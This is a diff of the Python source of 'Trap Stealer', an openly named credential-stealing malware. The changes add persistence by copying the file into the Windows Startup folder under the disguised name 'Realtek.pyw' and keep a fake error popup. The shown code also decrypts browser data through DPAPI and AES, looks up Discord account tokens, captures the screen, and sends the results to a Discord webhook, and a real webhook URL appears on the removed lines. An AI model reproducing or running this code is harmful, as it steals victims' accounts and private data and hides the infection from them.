@@ -1,9 +1,7 @@
 import os 
-from os import getenv
+from os import getenv, startfile
 import threading
 from sys import executable
-from sqlite3 import connect as sql_connect
-import sqlite3
 import re
 from base64 import b64decode
 from json import loads as json_loads, load
@@ -11,19 +9,23 @@ from ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_
 from urllib.request import Request, urlopen
 from json import loads, dumps
 import time
-import shutil
 from zipfile import ZipFile
-import random
 import re
 import subprocess
-import json, socket, win32crypt, getpass, ctypes
+import socket, getpass, ctypes
 from PIL import ImageGrab
-
+import string
+from shutil import copy
+from os.path import isfile, join
 ### CONFIG ### 
-shitty_message = True # If True it will print fake message, if you want to disable it replace with False
 fakeerror = True # If True it will make an fake error message at the end
-webhook = 'https://discord.com/api/webhooks/1101568518459228170/HMiQhuwnhaZmmVlUrQzXu-_sKlfDBQZQfRdGTPWfpCzFcKtLqlPHIixt3iqVsMGe-b9b' #Put ur webhook
-Startup = 'Unsuccessfully added to startup !'
+Startup = True # If True it will add the file into the startup folder
+shitty_message = True # If True it will print fake message, if you want to disable it replace with False
+
+webhook = '' #Put ur webhook
+
+StartupMessage = 'An error occurred while trying to add Trap Stealer to the Startup folder.     Or maybe you just put Startup = False' # The Startup message is like that at the start and change if Startup is set to True
+
 
 if shitty_message == True:
     print('Importing Module...')
@@ -32,41 +34,34 @@ else:
 file_path = os.path.realpath(__file__)
 USER_NAME = getpass.getuser()
 
-def add_to_startup(py_file_path=file_path, bat_file_path=None):
-    global Startup
-    if not bat_file_path:
-        bat_file_path = os.path.join(os.path.expanduser('~'), 'AppData', 'Roaming', 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
-    Startup = 'Successfully added to startup !'
-    py_file_name = os.path.basename(py_file_path)
-    py_shortcut_path = os.path.join(bat_file_path, py_file_name[:-3] + "lnk")
-    python_exe_path = os.path.join(os.path.dirname(os.__file__), 'pythonw.exe')
-    with open(py_shortcut_path, 'w') as shortcut_file:
-        shortcut_file.write(f'[InternetShortcut]\nURL=file://{py_file_path}\nIconFile={python_exe_path}\nIconIndex=0\n')
-
-    bat_file_name = os.path.basename(file_path[:-3] + ".pyw")
-    bat_file_path = os.path.join(bat_file_path, bat_file_name)
-    shutil.copy2(file_path, bat_file_path)
-
-    # Replace  with an empty string in the copied file
-    with open(bat_file_path, "r", encoding="utf-8") as f:
-        contents = f.read()
-    contents = contents.replace("add_to_startup()", "")
-    with open(bat_file_path, "w", encoding="utf-8") as f:
-        f.write(contents)
-
-    with open(bat_file_path, "r", encoding="utf-8") as f:
-        contents = f.read()
-
-# Replace the code block with a pass statement
-    contents = contents.replace('if fakeerror == True:\n    ctypes.windll.user32.MessageBoxW(0, "Error, Restart...", "Retry!", 16)\nelse:pass', 'pass')
-
-    # Write the updated contents back to the file
-    with open(bat_file_path, "w", encoding="utf-8") as f:
-        f.write(contents)
-    return Startup
 
 
-add_to_startup()
+path = f"{os.getenv('appdata')}\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Realtek.pyw"
+
+
+def startup():
+    global StartupMessage
+    StartupMessage = 'Sucessfully added to startup'
+    if not isfile(path):
+        copy(__file__, path)
+        with open(path, 'r+b') as f:
+            content = f.read()
+            f.seek(0)
+            f.write(content.replace(b"fakeerror = True", b"fakeerror = False"))
+            f.truncate()
+    else:
+        if __file__.replace('\\', '/') != path.replace('\\', '/'):
+            pass
+
+
+try:
+    if Startup == True:
+        startup()
+    else:
+        pass
+except:
+    pass
+
 
 def LoadUrlib(hook, data='', files='', headers=''):
     for i in range(8):
@@ -80,8 +75,7 @@ def LoadUrlib(hook, data='', files='', headers=''):
         except: 
             pass
 requirements = [
-    ["requests", "requests"],
-    ["Crypto.Cipher", "pycryptodome"]
+    ["requests", "requests"],["Crypto.Cipher", "pycryptodome"]
 ]
 import requests
 from Crypto.Cipher import AES
@@ -193,10 +187,13 @@ def CryptUnprotectData(encrypted_bytes, entropy=b''):
 
     if windll.crypt32.CryptUnprotectData(byref(blob_in), None, byref(blob_entropy), None, None, 0x01, byref(blob_out)):
         return GetData(blob_out)
+    
+
 if shitty_message == True:
     print('Adding Requests...')
 else:
     pass
+
 def DecryptValue(buff, master_key=None):
     starts = buff.decode(encoding='utf8', errors='ignore')[:3]
     if starts == 'v10' or starts == 'v11':
@@ -255,7 +252,7 @@ def GetTokenInfo(token):
     UserInfo = loads(urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=headers)).read().decode())
 
     # Account information
-    username = UserInfo["username"];hashtag = UserInfo["discriminator"];email = UserInfo["email"];id = UserInfo["id"];pfp = UserInfo["avatar"];flags = UserInfo["public_flags"];nitro = "";phone = "-";
+    username = UserInfo["username"];hashtag = UserInfo["discriminator"];email = UserInfo["email"];id = UserInfo["id"];pfp = UserInfo["avatar"];flags = UserInfo["public_flags"];nitro = "";phone = "-"
 
     if "premium_type" in UserInfo: 
         nitros = UserInfo["premium_type"]
@@ -464,7 +461,7 @@ data = {
     "embeds": [
         {
             "title": "🍪 Trap Stealer Information",
-            "description": f"{globalinfo}\nStartup : {Startup}",
+            "description": f"{globalinfo}\nStartup : {StartupMessage}",
             "color": 0xffb6c1,
             "thumbnail": {
                 "url": "https://media.tenor.com/q-2V2y9EbkAAAAAC/felix-felix-argyle.gif"
